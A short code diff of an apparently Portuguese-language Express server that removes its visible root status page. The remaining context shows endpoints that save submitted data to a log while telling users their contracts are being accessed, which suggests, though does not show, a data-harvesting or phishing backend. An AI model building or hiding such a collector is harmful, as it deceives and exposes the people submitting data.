@@ -57,11 +57,6 @@ app.post('/acessar-contratos', (req, res) => {
 
     res.status(200).json({ message: 'Acessando seus contratos. Por favor, aguarde...' });
 });
-
-app.get('/', (req, res) => {
-    res.send('<h1>Servidor no ar!</h1><p>Aguardando requisições POST para /salvar-dados ou /acessar-contratos.</p>');
-});
-
 app.listen(port, () => {
     console.log(`Servidor funcional rodando em http://localhost:${port}`);
     console.log(`Aguardando dados... tudo sera mandado para: "${NOME_ARQUIVO_LOG}"`);
